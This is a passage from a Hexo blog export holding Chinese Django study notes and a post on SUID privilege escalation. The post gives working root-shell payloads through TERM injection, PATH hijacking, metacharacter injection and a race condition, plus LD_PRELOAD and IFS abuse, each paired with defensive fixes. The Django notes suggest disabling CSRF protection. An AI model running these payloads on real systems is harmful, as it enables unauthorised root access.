title=\"models.py\"></a>models.py</h5><h6 id=\"Orm\"><a href=\"#Orm\" class=\"headerlink\" title=\"Orm\"></a>Orm</h6><p>对象关系映射</p>\n<p>将对象与一张表一一对应,便捷</p>\n<p>操作有限、牺牲执行效率</p>\n<h6 id=\"models\"><a href=\"#models\" class=\"headerlink\" title=\"models\"></a>models</h6><p>1.在settings.py中设置数据库驱动</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ENGINE&#x27;</span>: <span class=\"string\">&#x27;django.db.backends.sqlite3&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;NAME&#x27;</span>: BASE_DIR / <span class=\"string\">&#x27;db.sqlite3&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2.在models.py中定义orm的关系</p>\n<p>类 -&gt; 表</p>\n<p>对象 -&gt; 数据行(记录)</p>\n<p>属性 -&gt; 字段</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span>(<span class=\"params\">models.Model</span>):</span>  <span class=\"comment\"># 定义一张表，继承Model类</span></span><br><span class=\"line\">    username = models.CharField(max_length=<span class=\"number\">32</span>)  <span class=\"comment\"># varchar(32)</span></span><br><span class=\"line\">    password = models.CharField(max_length=<span class=\"number\">32</span>)</span><br></pre></td></tr></table></figure>\n\n<p>3.<code>python3 manage.py makemigrations</code> 检测所有app有什么变化,制作迁移文件</p>\n<p>4.<code>python3 manage.py migrate  </code> 根据迁移文件,将变更迁移到数据库</p>\n<h5 id=\"数据库查询\"><a href=\"#数据库查询\" class=\"headerlink\" title=\"数据库查询\"></a>数据库查询</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"comment\"># models.User.objects.get(username=user, password=pwd)</span></span><br><span class=\"line\"><span class=\"comment\"># 当get函数查询无结果或有多个结果时会报错</span></span><br><span class=\"line\"><span class=\"comment\"># 建议使用filter</span></span><br><span class=\"line\">models.User.objects.<span class=\"built_in\">all</span>().orderby(<span class=\"string\">&#x27;-id&#x27;</span>)<span class=\"comment\">#按照id字段逆序排列</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> models.User.objects.<span class=\"built_in\">filter</span>(username=user, password=pwd):</span><br><span class=\"line\">  <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"数据库增加\"><a href=\"#数据库增加\" class=\"headerlink\" title=\"数据库增加\"></a>数据库增加</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\">models.User.objects.create(name=name)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"数据库删除\"><a href=\"#数据库删除\" class=\"headerlink\" title=\"数据库删除\"></a>数据库删除</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\">models.User.objects.get(<span class=\"built_in\">id</span>=<span class=\"built_in\">id</span>).delete()</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"数据库修改\"><a href=\"#数据库修改\" class=\"headerlink\" title=\"数据库修改\"></a>数据库修改</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = models.User.objects.<span class=\"built_in\">filter</span>(<span class=\"built_in\">id</span>=request.POST.get(<span class=\"string\">&#x27;id&#x27;</span>))[<span class=\"number\">0</span>]</span><br><span class=\"line\">p.name = <span class=\"string\">&#x27;xxx&#x27;</span></span><br><span class=\"line\">p.save()</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"修改数据库为mysql\"><a href=\"#修改数据库为mysql\" class=\"headerlink\" title=\"修改数据库为mysql\"></a>修改数据库为mysql</h5><p>1.创建mysql数据库</p>\n<p>2.修改settings.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ENGINE&#x27;</span>: <span class=\"string\">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;NAME&#x27;</span>: <span class=\"string\">&#x27;login&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;HOST&#x27;</span>: <span class=\"string\">&#x27;localhost&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PORT&#x27;</span>: <span class=\"number\">3306</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;USER&#x27;</span>: <span class=\"string\">&#x27;xxx&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PASSWORD&#x27;</span>: <span class=\"string\">&#x27;xxx&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\">pymysql.install_as_MySQLdb()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>3.写model</p>\n<p>4.执行数据库迁移</p>\n<p><code>python3 manage.py makemigrations</code></p>\n<p><code>Python3 manage.py migrate</code></p>\n<h5 id=\"模糊语法\"><a href=\"#模糊语法\" class=\"headerlink\" title=\"模糊语法\"></a>模糊语法</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>序号<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>id<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>name<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">        &#123;% for i in p_list %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; forloop.counter &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; i.id &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; i.name &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;lists.html&#x27;</span>, context=&#123;<span class=\"string\">&#x27;p_list&#x27;</span>: lists&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Django相关的命令\"><a href=\"#Django相关的命令\" class=\"headerlink\" title=\"Django相关的命令\"></a>Django相关的命令</h4><h5 id=\"1-下载安装\"><a href=\"#1-下载安装\" class=\"headerlink\" title=\"1.下载安装\"></a>1.下载安装</h5><p><code>Pip3 install diango</code>创建 diango项目</p>\n<p><code>django-admin startproject</code>项目名称 启动项目</p>\n<h6 id=\"切换到项目的根目录\"><a href=\"#切换到项目的根目录\" class=\"headerlink\" title=\"切换到项目的根目录\"></a>切换到项目的根目录</h6><p><code>python3 manage. py runserver [127.0.0.1[:8000]]</code>运行服务</p>\n<h6 id=\"创建app-1\"><a href=\"#创建app-1\" class=\"headerlink\" title=\"创建app\"></a>创建app</h6><p><code>python3 manage. py startapp app</code>    名称 数据库迁移的命令</p>\n<p><code>python manage. py makemigrations</code> 检测app下的 model.py的变化记录下变更记录 </p>\n<p><code>python manage. py migrate</code> 迁移将变更记录同步到数据库中</p>\n<h5 id=\"2-settings配置\"><a href=\"#2-settings配置\" class=\"headerlink\" title=\"2.settings配置\"></a>2.settings配置</h5><p>​    BASE_DIR 项目的根目录</p>\n<p>​    INSTALLED_APPS 注册的app</p>\n<p>​    MIDDLEWARE 中间件</p>\n<p>​        注释CSRF保护,可以提交POST请求</p>\n<p>​    TEMPLATES模板</p>\n<p>​        DIRS: [os.path.join(BASE_DIR, ‘templates’)] </p>\n<p>​    静态文件</p>\n<p>​        STATIC_URL = ‘/static/‘ 静态文件的别名</p>\n<p>​        STATICFILES_DIRS = [</p>\n<p>BASE_DIR, ‘static’)                </p>\n<p>​                ]</p>\n<h5 id=\"3-django使用mysql\"><a href=\"#3-django使用mysql\" class=\"headerlink\" title=\"3.django使用mysql\"></a>3.django使用mysql</h5><h6 id=\"1-创建mysql数据库\"><a href=\"#1-创建mysql数据库\" class=\"headerlink\" title=\"1.创建mysql数据库\"></a>1.创建mysql数据库</h6><h6 id=\"2-配置settings\"><a href=\"#2-配置settings\" class=\"headerlink\" title=\"2.配置settings\"></a>2.配置settings</h6><p>​            </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES</span><br><span class=\"line\">ENGINE django.db.backends.mysql</span><br><span class=\"line\">NAME 数据库名</span><br><span class=\"line\">HOST IP地址</span><br><span class=\"line\">PORT <span class=\"number\">3306</span></span><br><span class=\"line\">USER 用户名</span><br><span class=\"line\">PASSWORD 密码</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"3-使用pymysql模块连接mysql数据库\"><a href=\"#3-使用pymysql模块连接mysql数据库\" class=\"headerlink\" title=\"3.使用pymysql模块连接mysql数据库\"></a>3.使用pymysql模块连接mysql数据库</h6><p>建议写在__init__.py中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"4-在app的models-py写入model-models-model\"><a href=\"#4-在app的models-py写入model-models-model\" class=\"headerlink\" title=\"4.在app的models.py写入model(models.model)\"></a>4.在app的models.py写入model(models.model)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from django import models</span><br><span class=\"line\">class User(models.Model):</span><br><span class=\"line\">\tusername &#x3D; models.CharField(max_length&#x3D;32)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"5-迁移至数据库\"><a href=\"#5-迁移至数据库\" class=\"headerlink\" title=\"5.迁移至数据库\"></a>5.迁移至数据库</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py makemigrations</span><br><span class=\"line\">python3 manage.py migrate</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-urls-py-路径与函数对应关系\"><a href=\"#4-urls-py-路径与函数对应关系\" class=\"headerlink\" title=\"4.urls.py 路径与函数对应关系\"></a>4.urls.py 路径与函数对应关系</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> views</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;list/&#x27;</span>, views.p_list),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;create/&#x27;</span>, views.create),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;delete/&#x27;</span>, views.delete),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;edit/&#x27;</span>, views.edit)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-函数\"><a href=\"#5-函数\" class=\"headerlink\" title=\"5.函数\"></a>5.函数</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xxx</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">\trequest.method  <span class=\"comment\"># 请求方式</span></span><br><span class=\"line\">\trequest.POST  <span class=\"comment\"># post传输的参数</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span></span><br><span class=\"line\">\t<span class=\"comment\"># render(request, &#x27;login.html&#x27;, context=&#123;&#x27;info&#x27;: &#x27;Success&#x27;&#125;)  渲染并返回HTML页面</span></span><br><span class=\"line\">  <span class=\"comment\"># HttpResponse(&#x27;字符串&#x27;)</span></span><br><span class=\"line\">  <span class=\"comment\"># redirect(&#x27;/index&#x27;) </span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"6-ORM\"><a href=\"#6-ORM\" class=\"headerlink\" title=\"6.ORM\"></a>6.ORM</h5><p>对象关系映射</p>\n<p>类 -&gt; 表</p>\n<p>对象 -&gt; 数据行</p>\n<p>属性 -&gt; 字段</p>\n<h6 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\">models.User.objects.<span class=\"built_in\">all</span>()</span><br><span class=\"line\">models.User.<span class=\"built_in\">object</span>.get(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>)</span><br><span class=\"line\">models.User.<span class=\"built_in\">object</span>.<span class=\"built_in\">filter</span>(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>,name=<span class=\"string\">&#x27;x&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"增加\"><a href=\"#增加\" class=\"headerlink\" title=\"增加\"></a>增加</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">models.User.objects.create(name=<span class=\"string\">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">models.User.objects.get(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>).delete()</span><br><span class=\"line\">models.User.objects.<span class=\"built_in\">filter</span>(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>).delete()</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"修改\"><a href=\"#修改\" class=\"headerlink\" title=\"修改\"></a>修改</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">obj = models.User.objects.get(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>)</span><br><span class=\"line\">obj.name = <span class=\"string\">&#x27;xxx&#x27;</span></span><br><span class=\"line\">obj.save()</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"7-模版语法\"><a href=\"#7-模版语法\" class=\"headerlink\" title=\"7.模版语法\"></a>7.模版语法</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return render(request, &#39;filename.html&#39;, context&#x3D;&#123;&#39;k&#39;:&#39;1&#39;&#125;)</span><br><span class=\"line\">返回并渲染一个html页面</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;  k1  &#125;&#125;  # 替换内容</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;%  for i in K  %&#125;</span><br><span class=\"line\">\t&#123;&#123;  forloop.counter. &#125;&#125;</span><br><span class=\"line\">\t&#123;&#123; i.name  &#125;&#125;</span><br><span class=\"line\">&#123;%  endfor  %&#125;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"SUID越权利用","date":"2021-04-10T13:41:59.000Z","_content":"\n# Set-UID Privileged Programs\n\n## 原理:\n\n### 操作系统:\n\n#### Linux:\n\nlinux系统具有严格的权限管理,故只有linux系统有suid属性\n\n#### Windows:\n\n但是windows是怎么解决这个问题的呢?\n\n### 工作原理:\n\n当一个文件设置为suid属性时,则当***任意用户***在运行此程序时,都变为此***程序拥有者***所拥有的权限\n\n### 情景:\n\n1.你希望别人能通过一个程序***间接地***访问你的文件,但你又***不希望***别人能够***直接查看更改***你的文件,那这要怎么办呢?答案是:将此程序设置为suid属性\n\n2.shadow文件是000的权限,即所有用户都不能修改(**root无视权限限制**)当用户使用passwd命令更改密码时,就是因为passwd属性设置为suid,而其拥有者为root,所以可以更改shadow文件\n\n## 漏洞\n\n### 简介:\n\n大多数管理员都通过suid属性便捷他们的日常工作.但在这其中,大多数管理员都没有注意到一些细微的问题,以导致安全问题的发生.\n\n### 利用过程:\n\n```bash\n% ls change-pass\n-rwsr-x--- 1 root helpdesk\n 37 Feb 26 16:35 change-pass\n% cat change-pass\n#!/bin/csh -b\nset user = $1\npasswd $user\n```\n\n假设我创建了一个含suid属性的shell脚本,用于方便用户更改密码.此时一切看起来安好,然而却有漏洞存在\n\n#### 1.永远不要使用C-shell编写SUID脚本\n\n当程序在运行时,会接收到许多参数.大多数时候,程序员都关注于明显的输入,例如文中的$1,但漏洞往往隐藏在一些不明显的地方——环境变量\n\npayload:\n\n```bash\nenv TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`' change-pass\n```\n\n此处重设置了TERM变量,而当C-shell脚本在运行时,便执行了TERM中的命令,从而导致漏洞发生\n\n#### 2.记住手动设置PATH,并且使用绝对路径\n\n在上文中的`passwd $user`命令中,passwd使用了相对路径,从而导致漏洞发生.\n\n在正常情况下,系统会去搜索PATH路径下的passwd,然后执行/usr/bin/passwd文件\n\n但是如果攻击者将PATH设置为当前路径,并且创建一个恶意shell脚本,那么就会导致漏洞发生\n\npayload:\n\n```bash\n% export PATH='/tmp'\n% echo \"cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh\" >/tmp/passwd\n% ./change-pass\n```\n\n更改后的脚本如下:\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\n/usr/bin/passwd $user\n```\n\n另一个例子有一个C文件调用了system()函数,`system(\"mail\")`\n\n攻击者可以通过修改PATH,然后创建相应文件进行攻击\n\n#### 3.设置LD_LIBRARY_PATH\n\n当linux中,除非在编译时加上static选项,否则都会默认调用动态链接库`ld.so/ld-linux.so`\n\n可以使用`ldd FILE`查看所依赖的库\n\n当程序运行时会在LD_LIBRARY_PATH变量中查找所需动态库的地址,如果攻击者将此环境变量重置,从而将动态链接库替换为恶意代码,那么就会导致恶意代码执行\n\n解决方法:\n\n1.在程序中设置此环境变量\n\n2.在编译时静态连接\n\n#### 4.设置LD_PRELOAD变量\n\n与3类似,当程序在运行前,会先链接此变量中的动态链接库,如果攻击者修改为自己的恶意链接库,则造成危害\n\n举个例子:\n\n`export LD_PRELOAD=./libmylib.so`\n\n```c\n//a.c    C代码\n#include <stdio.h>\nvoid sleep (int s)\n{\nprintf(\"I am not sleeping!\\n\");\n}\n```\n\n编译:\n\n```bash\ngcc -fPIC -g -c a.c\ngcc -shared -o libmylib.so a.o -lc\n```\n\n```c\n//被攻击程序\nint main()\n{\nsleep(1);\nreturn 0;\n}\n```\n\n运行如上程序,则可以通过SUID执行恶意代码\n\n#### 5.了解程序是怎么运作的\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\nrm /tmp/.user\necho \"$user\" > /tmp/.user\nisroot='/usr/bin/grep -c root /tmp/.user'\n[ \"$isroot\" -gt 0 ] && echo \"You Can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n承接上文,如果此程序可以用来更改root的密码,那岂不是犯了大错,所以在程序中加入了用户检测,看看是不是root.如果是,那么就退出程序\n\n你以为这样就万事大吉了吗?不,还有许多问题.\n\n思考一个问题,如果用户输入为空,即单纯运行此脚本,那么是否会正常执行passwd命令?\n\n要记住,当passwd输入为空时,默认更改的账号是执行者的账号.又由于suid的设置,即会更改root的密码.也就是说,前面的检测不完全.\n\n新文件:\n\n```BASH\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\nrm /tmp/.user\necho \"$user\" > /tmp/.user\nisroot='/usr/bin/grep -c root /tmp/.user'\n[ \"$isroot\" -gt 0 ] && echo \"You Can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n可以看到,在这里添加了检测输入是否为空,如果为空即退出.\n\n##### 所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.\n\n#### 6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.\n\n当攻击者在脚本删除文件的一瞬间后,又创建了一个.user文件,内部为空.那么这个时候会被覆盖吗?也许会,但也许也不会,这要看文件权限是怎么设置的.但是一旦没有覆盖,攻击者就绕过了用户名检测,就可以更改root的密码了.\n\n#### 7.检查所有输入,去除元字符\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\n[ \"$user\" = root ] && echo \"You can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n​\t在新脚本中,我们不再使用临时文件,转而直接检测.但却没有对用户输入进行更深的检测,这就有可能导致漏洞的发生\n\npayload: `./change-pass \"user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh\"`\n\n可以看到,在此处运用了`;`进行分割,当程序执行完passwd命令后,又会以root身份执行其他命令,这无异是一个很大的问题.\n\n新脚本:\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=${1##*[ \\\\$/;()|\\>\\<& ]}\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\n[ \"$user\" = root ] && \"You can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n在此处,我们对用户的输入进行过滤,去除元字符,从而保障语句执行的正确性.\n\n#### 8.记得设置IFS\n\nIFS,一个环境变量,Internal Field Separator,即内部字段分隔符.在这里,如果提前设置\n\n`export IFS='/'`那么当程序执行`/usr/bin/passwd`时,就会执行`usr`、`bin`、`passwd`三个命令,从而造成危险\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nIFS=' '\nuser=${1##*[ \\\\$/;()|\\>\\<& ]}\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\n[ \"$user\" = root ] && \"You can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n#### 9.不可避免的危险——固有条件竞争\n\n程序在执行suid脚本时分为两步\n\n1.系统打开一个新shell\n\n2.新shell读取脚本的内容并执行.\n\n如果时间点卡得刚刚好,那么攻击者可以先创建一个链接,在执行改链接文件的瞬间替换它的内容,从而实现通过SUID所有者权限执行任意内容\n\npayload:\n\n```bash\n./rootme & rm rootme && \\\necho \"cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh\" \\\n >> rootme\n```\n\n### \t修复:\n\n#### \t\t尽量少调用外部函数\n\n#### \t\t最小特权原则\n\n## 参考\n\n[EN - SUID Privileged Programs.pdf](http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf)\n\n[EN - Dangers of SUID Shell Scripts.pdf](http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf)\n\n","source":"_posts/SUID越权利用.md","raw":"---\ntitle: SUID越权利用\ndate: 2021-04-10 21:41:59\ntags: SUID 渗透测试\n---\n\n# Set-UID Privileged Programs\n\n## 原理:\n\n### 操作系统:\n\n#### Linux:\n\nlinux系统具有严格的权限管理,故只有linux系统有suid属性\n\n#### Windows:\n\n但是windows是怎么解决这个问题的呢?\n\n### 工作原理:\n\n当一个文件设置为suid属性时,则当***任意用户***在运行此程序时,都变为此***程序拥有者***所拥有的权限\n\n### 情景:\n\n1.你希望别人能通过一个程序***间接地***访问你的文件,但你又***不希望***别人能够***直接查看更改***你的文件,那这要怎么办呢?答案是:将此程序设置为suid属性\n\n2.shadow文件是000的权限,即所有用户都不能修改(**root无视权限限制**)当用户使用passwd命令更改密码时,就是因为passwd属性设置为suid,而其拥有者为root,所以可以更改shadow文件\n\n## 漏洞\n\n### 简介:\n\n大多数管理员都通过suid属性便捷他们的日常工作.但在这其中,大多数管理员都没有注意到一些细微的问题,以导致安全问题的发生.\n\n### 利用过程:\n\n```bash\n% ls change-pass\n-rwsr-x--- 1 root helpdesk\n 37 Feb 26 16:35 change-pass\n% cat change-pass\n#!/bin/csh -b\nset user = $1\npasswd $user\n```\n\n假设我创建了一个含suid属性的shell脚本,用于方便用户更改密码.此时一切看起来安好,然而却有漏洞存在\n\n#### 